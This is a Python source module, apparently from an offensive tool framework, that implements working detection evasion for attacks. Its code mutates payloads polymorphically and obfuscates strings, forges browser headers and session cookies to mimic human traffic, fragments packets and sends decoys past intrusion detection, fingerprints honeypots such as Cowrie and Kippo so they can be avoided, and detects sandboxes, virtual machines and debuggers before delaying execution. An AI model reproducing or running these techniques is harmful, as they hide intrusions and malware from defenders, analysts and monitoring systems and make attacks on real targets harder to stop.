"""
Detection Avoidance Module
Advanced techniques to avoid detection by security systems
"""

import os
import sys
import time
import random
import hashlib
import threading
import subprocess
from typing import Dict, List, Optional, Any, Tuple, Set
from dataclasses import dataclass, field
from pathlib import Path
import socket
import struct
import json

from core.utils import NetworkUtils, CryptoUtils
from core.logger import logger


@dataclass
class DetectionConfig:
    """Configuration for detection avoidance"""
    # Signature evasion
    enable_signature_evasion: bool = True
    randomize_payloads: bool = True
    use_polymorphic_code: bool = True
    
    # Behavioral evasion
    enable_behavioral_evasion: bool = True
    mimic_legitimate_traffic: bool = True
    use_slow_attacks: bool = True
    
    # Honeypot detection
    enable_honeypot_detection: bool = True
    honeypot_detection_methods: List[str] = field(default_factory=lambda: [
        'response_analysis', 'timing_analysis', 'service_fingerprinting'
    ])
    
    # IDS/IPS evasion
    enable_ids_evasion: bool = True
    fragment_packets: bool = True
    use_decoy_packets: bool = True
    randomize_packet_timing: bool = True
    
    # WAF evasion
    enable_waf_evasion: bool = True
    use_encoding_techniques: bool = True
    bypass_rate_limiting: bool = True
    
    # Sandbox evasion
    enable_sandbox_evasion: bool = True
    detect_virtualization: bool = True
    delay_execution: bool = True
    
    # Anti-analysis
    enable_anti_analysis: bool = True
    detect_debugging: bool = True
    obfuscate_strings: bool = True


class SignatureEvasion:
    """Signature-based detection evasion"""
    
    def __init__(self, config: DetectionConfig):
        self.config = config
        self.payload_variants = {}
        self.string_obfuscation_cache = {}
    
    def generate_payload_variant(self, base_payload: str, variant_id: str = None) -> str:
        """Generate payload variant to avoid signature detection"""
        if not self.config.enable_signature_evasion:
            return base_payload
        
        variant_id = variant_id or CryptoUtils.generate_random_string(8)
        
        if variant_id in self.payload_variants:
            return self.payload_variants[variant_id]
        
        # Apply multiple evasion techniques
        variant = base_payload
        
        if self.config.randomize_payloads:
            variant = self._randomize_payload(variant)
        
        if self.config.use_polymorphic_code:
            variant = self._apply_polymorphic_transformation(variant)
        
        self.payload_variants[variant_id] = variant
        return variant
    
    def _randomize_payload(self, payload: str) -> str:
        """Randomize payload structure"""
        try:
            # Add random padding
            padding_size = random.randint(1, 10)
            padding = CryptoUtils.generate_random_string(padding_size)
            
            # Insert padding at random positions
            positions = sorted(random.sample(
                range(len(payload)), 
                min(3, len(payload) // 10)
            ))
            
            result = payload
            offset = 0
            
            for pos in positions:
                insert_pos = pos + offset
                result = result[:insert_pos] + padding + result[insert_pos:]
                offset += len(padding)
            
            return result
            
        except Exception as e:
            logger.debug(f"Payload randomization failed: {e}")
            return payload
    
    def _apply_polymorphic_transformation(self, payload: str) -> str:
        """Apply polymorphic transformations"""
        try:
            transformations = [
                self._case_transformation,
                self._character_substitution,
                self._encoding_transformation
            ]
            
            # Apply random transformations
            num_transforms = random.randint(1, len(transformations))
            selected_transforms = random.sample(transformations, num_transforms)
            
            result = payload
            for transform in selected_transforms:
                result = transform(result)
            
            return result
            
        except Exception as e:
            logger.debug(f"Polymorphic transformation failed: {e}")
            return payload
    
    def _case_transformation(self, text: str) -> str:
        """Apply case transformations"""
        result = ""
        for char in text:
            if char.isalpha():
                if random.choice([True, False]):
                    result += char.upper()
                else:
                    result += char.lower()
            else:
                result += char
        return result
    
    def _character_substitution(self, text: str) -> str:
        """Apply character substitutions"""
        substitutions = {
            'a': ['@', 'α'],
            'e': ['3', 'ε'],
            'i': ['1', '!', 'ι'],
            'o': ['0', 'ο'],
            's': ['$', 'σ'],
            't': ['7', 'τ']
        }
        
        result = text
        for original, replacements in substitutions.items():
            if original in result.lower():
                replacement = random.choice(replacements)
                # Replace some occurrences randomly
                positions = [i for i, c in enumerate(result.lower()) if c == original]
                if positions:
                    replace_count = random.randint(1, max(1, len(positions) // 2))
                    replace_positions = random.sample(positions, replace_count)
                    
                    for pos in sorted(replace_positions, reverse=True):
                        result = result[:pos] + replacement + result[pos+1:]
        
        return result
    
    def _encoding_transformation(self, text: str) -> str:
        """Apply encoding transformations"""
        encodings = ['url', 'html', 'unicode']
        encoding = random.choice(encodings)
        
        if encoding == 'url':
            return self._url_encode_random(text)
        elif encoding == 'html':
            return self._html_encode_random(text)
        elif encoding == 'unicode':
            return self._unicode_encode_random(text)
        
        return text
    
    def _url_encode_random(self, text: str) -> str:
        """Randomly URL encode characters"""
        import urllib.parse
        
        result = ""
        for char in text:
            if random.random() < 0.3:  # 30% chance to encode
                result += urllib.parse.quote(char)
            else:
                result += char
        return result
    
    def _html_encode_random(self, text: str) -> str:
        """Randomly HTML encode characters"""
        import html
        
        result = ""
        for char in text:
            if random.random() < 0.2:  # 20% chance to encode
                result += html.escape(char)
            else:
                result += char
        return result
    
    def _unicode_encode_random(self, text: str) -> str:
        """Randomly Unicode encode characters"""
        result = ""
        for char in text:
            if random.random() < 0.1:  # 10% chance to encode
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result
    
    def obfuscate_string(self, string: str) -> str:
        """Obfuscate string to avoid detection"""
        if not self.config.obfuscate_strings:
            return string
        
        if string in self.string_obfuscation_cache:
            return self.string_obfuscation_cache[string]
        
        # Simple XOR obfuscation
        key = random.randint(1, 255)
        obfuscated = ""
        
        for char in string:
            obfuscated += chr(ord(char) ^ key)
        
        # Store with deobfuscation info
        result = f"deobfuscate('{obfuscated}', {key})"
        self.string_obfuscation_cache[string] = result
        
        return result


class BehavioralEvasion:
    """Behavioral analysis evasion"""
    
    def __init__(self, config: DetectionConfig):
        self.config = config
        self.legitimate_patterns = self._load_legitimate_patterns()
    
    def _load_legitimate_patterns(self) -> Dict[str, Any]:
        """Load legitimate traffic patterns"""
        return {
            'user_agents': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ],
            'request_intervals': {
                'min': 1.0,
                'max': 30.0,
                'distribution': 'exponential'
            },
            'session_duration': {
                'min': 60,
                'max': 3600,
                'average': 300
            }
        }
    
    def mimic_human_behavior(self) -> Dict[str, Any]:
        """Generate human-like behavior patterns"""
        if not self.config.mimic_legitimate_traffic:
            return {}
        
        return {
            'user_agent': random.choice(self.legitimate_patterns['user_agents']),
            'request_interval': self._generate_human_interval(),
            'session_cookies': self._generate_session_cookies(),
            'referer': self._generate_realistic_referer(),
            'accept_language': self._generate_accept_language()
        }
    
    def _generate_human_interval(self) -> float:
        """Generate human-like request intervals"""
        # Exponential distribution mimics human behavior
        base_interval = random.expovariate(1.0 / 5.0)  # Average 5 seconds
        
        # Add some randomness
        jitter = random.uniform(0.5, 2.0)
        
        return max(1.0, base_interval * jitter)
    
    def _generate_session_cookies(self) -> Dict[str, str]:
        """Generate realistic session cookies"""
        return {
            'sessionid': CryptoUtils.generate_random_string(32),
            'csrftoken': CryptoUtils.generate_random_string(64),
            '_ga': f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}"
        }
    
    def _generate_realistic_referer(self) -> str:
        """Generate realistic referer header"""
        referers = [
            'https://www.google.com/search?q=',
            'https://www.bing.com/search?q=',
            'https://duckduckgo.com/?q=',
            'https://github.com/',
            'https://stackoverflow.com/'
        ]
        
        base_referer = random.choice(referers)
        if 'search?q=' in base_referer:
            search_terms = ['python', 'networking', 'security', 'tutorial']
            base_referer += random.choice(search_terms)
        
        return base_referer
    
    def _generate_accept_language(self) -> str:
        """Generate realistic Accept-Language header"""
        languages = [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.9',
            'en-US,en;q=0.9,es;q=0.8',
            'en-US,en;q=0.9,fr;q=0.8',
            'en-US,en;q=0.9,de;q=0.8'
        ]
        
        return random.choice(languages)
    
    def calculate_slow_attack_timing(self, base_rate: float) -> float:
        """Calculate timing for slow attacks"""
        if not self.config.use_slow_attacks:
            return base_rate
        
        # Slow down by factor of 2-10
        slowdown_factor = random.uniform(2.0, 10.0)
        return base_rate * slowdown_factor


class HoneypotDetection:
    """Honeypot detection and avoidance"""
    
    def __init__(self, config: DetectionConfig):
        self.config = config
        self.known_honeypots = set()
        self.suspicious_responses = []
    
    def is_honeypot(self, target: str, port: int = 80) -> bool:
        """Detect if target is a honeypot"""
        if not self.config.enable_honeypot_detection:
            return False
        
        target_key = f"{target}:{port}"
        if target_key in self.known_honeypots:
            return True
        
        detection_score = 0
        max_score = len(self.config.honeypot_detection_methods)
        
        for method in self.config.honeypot_detection_methods:
            if method == 'response_analysis':
                if self._analyze_response_patterns(target, port):
                    detection_score += 1
            
            elif method == 'timing_analysis':
                if self._analyze_timing_patterns(target, port):
                    detection_score += 1
            
            elif method == 'service_fingerprinting':
                if self._fingerprint_services(target, port):
                    detection_score += 1
        
        # If more than 60% of methods indicate honeypot
        is_honeypot = detection_score > (max_score * 0.6)
        
        if is_honeypot:
            self.known_honeypots.add(target_key)
            logger.warning(f"Detected potential honeypot: {target}:{port}")
        
        return is_honeypot
    
    def _analyze_response_patterns(self, target: str, port: int) -> bool:
        """Analyze response patterns for honeypot indicators"""
        try:
            # Send test requests and analyze responses
            test_requests = [
                b"GET / HTTP/1.1\r\nHost: test\r\n\r\n",
                b"GET /nonexistent HTTP/1.1\r\nHost: test\r\n\r\n",
                b"INVALID REQUEST\r\n\r\n"
            ]
            
            responses = []
            
            for request in test_requests:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))
                    sock.send(request)
                    
                    response = sock.recv(1024)
                    responses.append(response)
                    sock.close()
                    
                except Exception:
                    responses.append(b"")
            
            # Analyze response patterns
            # Honeypots often have identical responses to different requests
            if len(set(responses)) == 1 and responses[0]:
                return True
            
            # Check for generic/template responses
            for response in responses:
                response_str = response.decode('utf-8', errors='ignore').lower()
                honeypot_indicators = [
                    'honeypot', 'trap', 'decoy', 'fake',
                    'default apache', 'default nginx',
                    'under construction', 'coming soon'
                ]
                
                if any(indicator in response_str for indicator in honeypot_indicators):
                    return True
            
            return False
            
        except Exception as e:
            logger.debug(f"Response analysis failed: {e}")
            return False
    
    def _analyze_timing_patterns(self, target: str, port: int) -> bool:
        """Analyze timing patterns for honeypot indicators"""
        try:
            connection_times = []
            
            # Test multiple connections
            for _ in range(5):
                start_time = time.time()
                
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))
                    sock.close()
                    
                    connection_time = time.time() - start_time
                    connection_times.append(connection_time)
                    
                except Exception:
                    connection_times.append(float('inf'))
                
                time.sleep(0.1)
            
            # Analyze timing patterns
            valid_times = [t for t in connection_times if t != float('inf')]
            
            if len(valid_times) < 3:
                return False
            
            # Check for suspiciously consistent timing
            avg_time = sum(valid_times) / len(valid_times)
            variance = sum((t - avg_time) ** 2 for t in valid_times) / len(valid_times)
            
            # Very low variance might indicate simulated responses
            if variance < 0.001 and avg_time > 0.1:
                return True
            
            return False
            
        except Exception as e:
            logger.debug(f"Timing analysis failed: {e}")
            return False
    
    def _fingerprint_services(self, target: str, port: int) -> bool:
        """Fingerprint services for honeypot indicators"""
        try:
            # Send service-specific probes
            probes = {
                80: b"GET / HTTP/1.1\r\nHost: test\r\n\r\n",
                443: b"GET / HTTP/1.1\r\nHost: test\r\n\r\n",
                22: b"SSH-2.0-Test\r\n",
                21: b"USER anonymous\r\n",
                25: b"HELO test\r\n"
            }
            
            probe = probes.get(port, b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            sock.send(probe)
            
            response = sock.recv(1024)
            sock.close()
            
            response_str = response.decode('utf-8', errors='ignore')
            
            # Check for honeypot service signatures
            honeypot_signatures = [
                'Kippo', 'Cowrie', 'Dionaea', 'Glastopf',
                'HoneyPy', 'Conpot', 'Honeyd'
            ]
            
            if any(sig in response_str for sig in honeypot_signatures):
                return True
            
            return False
            
        except Exception as e:
            logger.debug(f"Service fingerprinting failed: {e}")
            return False


class IDSEvasion:
    """IDS/IPS evasion techniques"""
    
    def __init__(self, config: DetectionConfig):
        self.config = config
    
    def fragment_payload(self, payload: bytes, fragment_size: int = None) -> List[bytes]:
        """Fragment payload to evade IDS"""
        if not self.config.fragment_packets:
            return [payload]
        
        if fragment_size is None:
            fragment_size = random.randint(8, 64)
        
        fragments = []
        for i in range(0, len(payload), fragment_size):
            fragment = payload[i:i + fragment_size]
            fragments.append(fragment)
        
        return fragments
    
    def generate_decoy_packets(self, target: str, port: int, count: int = 5) -> List[bytes]:
        """Generate decoy packets to confuse IDS"""
        if not self.config.use_decoy_packets:
            return []
        
        decoy_packets = []
        
        for _ in range(count):
            # Generate random decoy data
            decoy_size = random.randint(64, 512)
            decoy_data = os.urandom(decoy_size)
            
            decoy_packets.append(decoy_data)
        
        return decoy_packets
    
    def calculate_packet_timing(self, base_interval: float) -> float:
        """Calculate packet timing to evade rate-based detection"""
        if not self.config.randomize_packet_timing:
            return base_interval
        
        # Add random jitter
        jitter_factor = random.uniform(0.5, 2.0)
        return base_interval * jitter_factor


class SandboxEvasion:
    """Sandbox detection and evasion"""
    
    def __init__(self, config: DetectionConfig):
        self.config = config
        self.sandbox_indicators = []
    
    def is_sandbox_environment(self) -> bool:
        """Detect if running in sandbox environment"""
        if not self.config.enable_sandbox_evasion:
            return False
        
        detection_methods = [
            self._check_virtualization,
            self._check_system_resources,
            self._check_running_processes,
            self._check_file_system,
            self._check_network_environment
        ]
        
        sandbox_score = 0
        
        for method in detection_methods:
            if method():
                sandbox_score += 1
        
        # If more than 2 methods indicate sandbox
        is_sandbox = sandbox_score >= 2
        
        if is_sandbox:
            logger.warning("Detected sandbox environment")
        
        return is_sandbox
    
    def _check_virtualization(self) -> bool:
        """Check for virtualization indicators (Linux/Unix compatible)"""
        try:
            # Check for VM-specific hardware
            vm_indicators = [
                'VMware', 'VirtualBox', 'QEMU', 'Xen',
                'Hyper-V', 'Parallels', 'KVM', 'Docker'
            ]
            
            # Linux-specific virtualization detection
            if sys.platform.startswith('linux'):
                # Check /proc/cpuinfo for hypervisor flag
                try:
                    with open('/proc/cpuinfo', 'r') as f:
                        cpuinfo = f.read()
                        if 'hypervisor' in cpuinfo.lower():
                            return True
                except FileNotFoundError:
                    pass
                
                # Check DMI information
                try:
                    with open('/sys/class/dmi/id/product_name', 'r') as f:
                        product_name = f.read().strip()
                        if any(vm.lower() in product_name.lower() for vm in vm_indicators):
                            return True
                except FileNotFoundError:
                    pass
                
                # Check for container environment
                try:
                    with open('/proc/1/cgroup', 'r') as f:
                        cgroup = f.read()
                        if 'docker' in cgroup or 'lxc' in cgroup:
                            return True
                except FileNotFoundError:
                    pass
            
            # Removed Windows-specific WMI checks for Linux compatibility
            
            # Check for VM-specific files/directories (cross-platform)
            vm_paths = [
                # Linux/Unix VM paths
                '/proc/xen', '/proc/vz', '/proc/bc',
                '/sys/bus/pci/devices/0000:00:04.0/vendor',  # VirtualBox
                '/sys/class/dmi/id/sys_vendor',
                '/dev/vmware',
                '/proc/cpuinfo',  # Check for hypervisor flags
                '/sys/hypervisor/type'  # Xen detection
            ]
            
            for path in vm_paths:
                if os.path.exists(path):
                    # Additional checks for cpuinfo
                    if path == '/proc/cpuinfo':
                        try:
                            with open(path, 'r') as f:
                                content = f.read().lower()
                                if 'hypervisor' in content or any(vm.lower() in content for vm in vm_indicators):
                                    return True
                        except:
                            pass
                    else:
                        return True
            
            # Check environment variables
            vm_env_vars = ['VMWARE_TOOLS', 'VBOX_USER_HOME', 'DOCKER_HOST']
            for env_var in vm_env_vars:
                if os.getenv(env_var):
                    return True
            
            return False
            
        except Exception as e:
            logger.debug(f"Virtualization check failed: {e}")
            return False
    
    def _check_system_resources(self) -> bool:
        """Check for limited system resources (sandbox indicator) - Linux compatible"""
        try:
            import psutil
            
            # Check RAM (sandboxes often have limited RAM)
            memory = psutil.virtual_memory()
            if memory.total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                return True
            
            # Check CPU count
            if psutil.cpu_count() < 2:
                return True
            
            # Check disk space (Linux/Unix compatible)
            if sys.platform.startswith('linux') or sys.platform == 'darwin':
                disk = psutil.disk_usage('/')
            else:
                disk = psutil.disk_usage('C:\\')
                
            if disk.total < 50 * 1024 * 1024 * 1024:  # Less than 50GB
                return True
            
            return False
            
        except Exception as e:
            logger.debug(f"System resources check failed: {e}")
            return False
    
    def _check_running_processes(self) -> bool:
        """Check for analysis/debugging processes - Linux compatible"""
        try:
            import psutil
            
            # Common analysis tools (cross-platform)
            analysis_processes = [
                # Windows analysis tools
                'wireshark.exe', 'tcpview.exe', 'procmon.exe', 'procexp.exe',
                'ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe',
                'vmsrvc.exe', 'vmtoolsd.exe', 'vboxservice.exe',
                # Linux analysis tools
                'wireshark', 'tcpdump', 'strace', 'ltrace', 'gdb',
                'radare2', 'r2', 'objdump', 'hexdump', 'strings',
                'volatility', 'binwalk', 'foremost', 'autopsy',
                # VM/Container processes (Linux)
                'vmware-vmx', 'VBoxHeadless', 'qemu-system',
                'dockerd', 'containerd', 'runc',
                # Monitoring tools (Linux)
                'htop', 'iotop', 'nethogs', 'iftop', 'ss', 'netstat',
                'lsof', 'ps', 'top', 'vmstat', 'iostat'
            ]
            
            # Get running processes
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if any(analysis_proc.lower() in proc_name for analysis_proc in analysis_processes):
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # Linux-specific checks
            if sys.platform.startswith('linux'):
                # Check for ptrace usage (debugging)
                try:
                    with open('/proc/sys/kernel/yama/ptrace_scope', 'r') as f:
                        ptrace_scope = f.read().strip()
                        if ptrace_scope == '0':  # Ptrace enabled for all processes
                            # Check if any process is being traced
                            for proc in psutil.process_iter(['pid']):
                                try:
                                    with open(f'/proc/{proc.info["pid"]}/status', 'r') as status_file:
                                        status = status_file.read()
                                        if 'TracerPid:\t0' not in status:
                                            return True
                                except (FileNotFoundError, PermissionError, psutil.NoSuchProcess):
                                    continue
                except FileNotFoundError:
                    pass
            
            return False
            
        except Exception as e:
            logger.debug(f"Process check failed: {e}")
            return False
    
    def _check_file_system(self) -> bool:
        """Check for sandbox/analysis file system artifacts - Linux compatible"""
        try:
            # Sandbox/analysis artifacts (cross-platform)
            suspicious_paths = [
                # Windows sandbox paths
                'C:\\analysis', 'C:\\sandbox', 'C:\\malware',
                'C:\\sample', 'C:\\virus', 'C:\\quarantine',
                # Linux analysis paths
                '/tmp/analysis', '/tmp/sandbox', '/tmp/malware',
                '/opt/analysis', '/opt/sandbox', '/var/log/analysis',
                '/home/analyst', '/home/malware', '/home/sandbox',
                # VM/Container indicators
                '/proc/xen', '/proc/vz', '/sys/hypervisor',
                '/dev/vmware', '/.dockerenv', '/run/.containerenv',
                # Analysis tools directories
                '/usr/bin/volatility', '/usr/bin/binwalk',
                '/usr/local/bin/radare2', '/opt/ghidra'
            ]
            
            # Check for suspicious files/directories
            for path in suspicious_paths:
                if os.path.exists(path):
                    return True
            
            # Linux-specific checks
            if sys.platform.startswith('linux'):
                # Check for analysis-related mount points
                try:
                    with open('/proc/mounts', 'r') as f:
                        mounts = f.read()
                        suspicious_mounts = ['tmpfs', 'overlay', 'aufs', 'debugfs']
                        for mount_type in suspicious_mounts:
                            if mount_type in mounts and '/tmp' in mounts:
                                return True
                except FileNotFoundError:
                    pass
                
                # Check for container indicators
                container_files = [
                    '/.dockerenv',
                    '/run/.containerenv',
                    '/proc/1/cgroup'
                ]
                
                for container_file in container_files:
                    if os.path.exists(container_file):
                        try:
                            with open(container_file, 'r') as f:
                                content = f.read()
                                if 'docker' in content or 'lxc' in content or 'container' in content:
                                    return True
                        except (PermissionError, FileNotFoundError):
                            pass
            
            # Check for common analysis file extensions in temp directories
            temp_dirs = ['/tmp', '/var/tmp'] if sys.platform.startswith('linux') else ['C:\\Temp', 'C:\\Windows\\Temp']
            
            for temp_dir in temp_dirs:
                if os.path.exists(temp_dir):
                    try:
                        for root, dirs, files in os.walk(temp_dir):
                            for file in files:
                                if file.endswith(('.dmp', '.pcap', '.log', '.trace', '.mem')):
                                    return True
                            # Don't recurse too deep
                            if root.count(os.sep) - temp_dir.count(os.sep) > 2:
                                break
                    except (PermissionError, OSError):
                        continue
            
            return False
            
        except Exception as e:
            logger.debug(f"File system check failed: {e}")
            return False
    
    def _check_network_environment(self) -> bool:
        """Check for analysis network environment - Linux compatible"""
        try:
            import subprocess
            
            # Check for common analysis/honeypot network indicators
            suspicious_ips = [
                '192.168.56.', '10.0.2.', '172.16.',  # VirtualBox/VMware default ranges
                '127.0.0.1', '0.0.0.0'  # Localhost/any address bindings
            ]
            
            # Get network interfaces and their IPs
            try:
                if sys.platform.startswith('linux'):
                    # Linux network interface check
                    result = subprocess.run(['ip', 'addr', 'show'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        output = result.stdout
                        for suspicious_ip in suspicious_ips:
                            if suspicious_ip in output:
                                return True
                        
                        # Check for VM-specific interface names
                        vm_interfaces = ['veth', 'docker', 'br-', 'virbr', 'vmnet', 'vboxnet']
                        for vm_interface in vm_interfaces:
                            if vm_interface in output:
                                return True
                
                elif sys.platform == "win32":
                    # Windows network check (fallback)
                    result = subprocess.run(['ipconfig'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        output = result.stdout
                        for suspicious_ip in suspicious_ips:
                            if suspicious_ip in output:
                                return True
                
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            
            # Check for suspicious network connections
            try:
                import psutil
                connections = psutil.net_connections()
                
                # Look for connections to analysis/honeypot services
                suspicious_ports = [8080, 8888, 9999, 31337, 1337]  # Common analysis ports
                
                for conn in connections:
                    if conn.laddr and conn.laddr.port in suspicious_ports:
                        return True
                    if conn.raddr and conn.raddr.port in suspicious_ports:
                        return True
                        
            except ImportError:
                pass
            
            # Linux-specific network checks
            if sys.platform.startswith('linux'):
                # Check for network namespaces (containers)
                try:
                    result = subprocess.run(['ip', 'netns', 'list'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0 and result.stdout.strip():
                        return True
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass
                
                # Check for bridge interfaces
                try:
                    if os.path.exists('/sys/class/net'):
                        for interface in os.listdir('/sys/class/net'):
                            bridge_path = f'/sys/class/net/{interface}/bridge'
                            if os.path.exists(bridge_path):
                                return True
                except (PermissionError, OSError):
                    pass
            
            return False
            
        except Exception as e:
            logger.debug(f"Network environment check failed: {e}")
            return False
    
    def apply_sandbox_evasion(self):
        """Apply sandbox evasion techniques"""
        if not self.config.enable_sandbox_evasion:
            return
        
        # Delay execution
        if self.config.delay_execution:
            delay = random.uniform(30, 120)  # 30-120 seconds
            logger.debug(f"Applying sandbox evasion delay: {delay}s")
            time.sleep(delay)


class DetectionManager:
    """Main detection avoidance manager"""
    
    def __init__(self, config: DetectionConfig = None):
        self.config = config or DetectionConfig()
        
        self.signature_evasion = SignatureEvasion(self.config)
        self.behavioral_evasion = BehavioralEvasion(self.config)
        self.honeypot_detection = HoneypotDetection(self.config)
        self.ids_evasion = IDSEvasion(self.config)
        self.sandbox_evasion = SandboxEvasion(self.config)
    
    def initialize_detection_avoidance(self) -> bool:
        """Initialize all detection avoidance systems"""
        logger.info("Initializing detection avoidance systems...")
        
        try:
            # Check for sandbox environment
            if self.sandbox_evasion.is_sandbox_environment():
                logger.warning("Sandbox detected - applying evasion techniques")
                self.sandbox_evasion.apply_sandbox_evasion()
            
            logger.info("Detection avoidance systems initialized")
            return True
            
        except Exception as e:
            logger.error(f"Failed to initialize detection avoidance: {e}")
            return False
    
    def validate_target(self, target: str, port: int = 80) -> bool:
        """Validate target is not a honeypot"""
        return not self.honeypot_detection.is_honeypot(target, port)
    
    def generate_evasive_payload(self, base_payload: str) -> str:
        """Generate payload with evasion techniques"""
        return self.signature_evasion.generate_payload_variant(base_payload)
    
    def get_behavioral_patterns(self) -> Dict[str, Any]:
        """Get behavioral patterns for legitimate traffic mimicking"""
        return self.behavioral_evasion.mimic_human_behavior()
    
    def fragment_data(self, data: bytes) -> List[bytes]:
        """Fragment data for IDS evasion"""
        return self.ids_evasion.fragment_payload(data)
    
    def calculate_evasive_timing(self, base_timing: float) -> float:
        """Calculate timing with evasion techniques"""
        # Apply behavioral evasion
        timing = self.behavioral_evasion.calculate_slow_attack_timing(base_timing)
        
        # Apply IDS evasion
        timing = self.ids_evasion.calculate_packet_timing(timing)
        
        return timing
    
    def get_detection_status(self) -> Dict[str, Any]:
        """Get current detection avoidance status"""
        return {
            'signature_evasion_enabled': self.config.enable_signature_evasion,
            'behavioral_evasion_enabled': self.config.enable_behavioral_evasion,
            'honeypot_detection_enabled': self.config.enable_honeypot_detection,
            'ids_evasion_enabled': self.config.enable_ids_evasion,
            'sandbox_evasion_enabled': self.config.enable_sandbox_evasion,
            'known_honeypots': len(self.honeypot_detection.known_honeypots),
            'payload_variants': len(self.signature_evasion.payload_variants)
        }